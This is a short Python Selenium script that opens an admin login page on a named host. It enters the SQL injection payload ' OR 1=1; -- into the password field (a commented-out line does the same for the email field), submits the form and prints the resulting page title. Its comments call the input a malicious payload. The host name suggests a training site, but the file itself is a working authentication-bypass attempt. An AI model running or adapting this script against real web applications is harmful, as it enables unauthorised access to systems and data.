from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import WebDriverException
import time

# Set the path to chromedriver
chromedriver_path = "/usr/bin/chromedriver"

# Initialize Chrome WebDriver with options
service = Service(executable_path=chromedriver_path)
options = webdriver.ChromeOptions()

# Uncomment the following line if you want to run Chrome in headless mode (without GUI)
# options.add_argument("--headless")

driver = webdriver.Chrome(service=service, options=options)
try:
    # Open the login page
    driver.get("https://training.host4india.in/shahid/admin/")

    # Find the username input field and fill it out with a malicious SQL injection payload
    username_input = driver.find_element("name","email")
    #username_input.send_keys("' OR 1=1; -- ")
    username_input.send_keys("test@gmail.com")
    
    # Find the password input field and fill it out with any valid password
    password_input = driver.find_element("name","password")
    password_input.send_keys("' OR 1=1; -- ")

    # Submit the form
    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
    submit_button.click()

    # Wait for a few seconds to see the result
    driver.implicitly_wait(5)

    time.sleep(10)

    # Print the page title or analyze the response
    print("Page title after login attempt:", driver.title)

except Exception as e:
    print("Error:", e)
finally:
    # Close the browser
    driver.quit()
